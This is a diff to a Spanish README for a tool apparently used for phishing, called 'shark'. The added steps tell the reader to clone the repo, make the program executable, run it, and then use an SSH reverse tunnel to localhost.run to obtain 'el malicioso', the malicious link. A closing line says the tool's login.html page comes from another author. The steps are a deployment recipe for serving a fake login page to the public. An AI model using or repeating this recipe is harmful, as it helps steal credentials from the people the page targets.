@@ -45,14 +45,18 @@ Clona este repositorio en tu máquina local. Una vez dentro de la carpeta que pr
 ```bash
 $ git clone https://github.com/NeoManD10/shark.git
 ```
+Otorga los permisos de ejecucion:
 ```bash
 $ chmod +x shark
 ```
+Ejecuta el programa y sigue instrucciones:
 ```bash
 $ ./shark
 ```
+Despues de la ejecucion escribe este comando para obtener el malicioso: 
 ```bash
 $ ssh -R 80:localhost:8080 nokey@localhost.run
 ```
+![image](https://github.com/user-attachments/assets/53c0318e-d9ae-4a30-bf50-73512143bb9f)
 
 **Cabe destacar el archivo login.html es codigo html es de AliMilani por el momento. Estoy en proceso de hacer mi version.**
